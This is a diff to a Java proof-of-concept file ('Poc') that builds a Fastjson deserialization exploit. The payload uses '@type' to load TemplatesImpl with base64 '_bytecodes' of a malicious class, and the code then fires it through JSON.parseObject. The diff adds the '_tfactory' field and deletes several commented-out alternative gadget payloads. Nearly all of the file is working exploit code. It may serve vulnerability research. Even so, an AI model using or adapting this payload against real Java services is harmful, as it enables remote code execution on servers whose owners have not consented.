@@ -3,6 +3,8 @@ package person;
 import com.alibaba.fastjson.JSON;
 import com.alibaba.fastjson.parser.Feature;
 import com.alibaba.fastjson.parser.ParserConfig;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import org.apache.commons.io.IOUtils;
 import org.apache.commons.codec.binary.Base64;
 
@@ -34,15 +36,14 @@ public class Poc {
         String evilCode = readClass(evilClassPath);
         final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
         String text1 = "{\"@type\":\"" + NASTY_CLASS +
-                "\",\"_bytecodes\":[\""+evilCode+"\"],'_name':'a.b',\"_outputProperties\":{ }," +
+                "\",\"_bytecodes\":[\""+evilCode+"\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ }," +
                 "\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n";
         System.out.println(text1);
-        //String text = "{\"@type\":\"java.lang.ProcessImpl\",\"alive\":true,\"errorStream\":{\"@type\":\"java.io.FileInputStream\",\"channel\":{\"@type\":\"sun.nio.ch.FileChannelImpl\",\"open\":true},\"fD\":{}},\"inputStream\":{\"@type\":\"java.io.BufferedInputStream\"},\"outputStream\":{\"@type\":\"java.io.BufferedOutputStream\"}}";
-        //String text = "{\"@type\":\"com.alibaba.json.bvt.parser.deser.\",\"builder\":{},\"process\":{\"@type\":\"java.lang.ProcessImpl\",\"alive\":false,\"errorStream\":{\"@type\":\"java.io.FileInputStream\",\"channel\":{\"@type\":\"sun.nio.ch.FileChannelImpl\",\"open\":true},\"fD\":{}},\"inputStream\":{\"@type\":\"java.io.BufferedInputStream\"},\"outputStream\":{\"@type\":\"java.io.BufferedOutputStream\"}}";
-        //String text = "{\"@type\":\"com.alibaba.json.bvt.parser.deser.deny.DenyTest11$Model0\",\"process\":{\"@type\":\"java.lang.ProcessImpl\",\"alive\":true,\"errorStream\":{\"@type\":\"java.io.FileInputStream\",\"channel\":{\"@type\":\"sun.nio.ch.FileChannelImpl\",\"open\":true},\"fD\":{}},\"inputStream\":{\"@type\":\"java.io.BufferedInputStream\"},\"outputStream\":{\"@type\":\"java.io.BufferedOutputStream\"}}}";
-        //String text = "{\"@type\":\"com.alibaba.json.bvt.parser.deser.deny.DenyTest11$SocketClass\",\"name\":\"Windows 7\",\"object\":{\"@type\":\"java.util.HashMap\",\"http://xxlegend.com\":\"http://xxlegend.com\"}}";
-        Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);
+        //String personStr = "{'name':"+text1+",'age':19}";
+        //Person obj = JSON.parseObject(personStr, Person.class, config, Feature.SupportNonPublicField);
+        Object obj = JSON.parseObject(text1, Object.class, config);
         //assertEquals(Model.class, obj.getClass());
+
     }
     public static void main(String args[]){
         try {
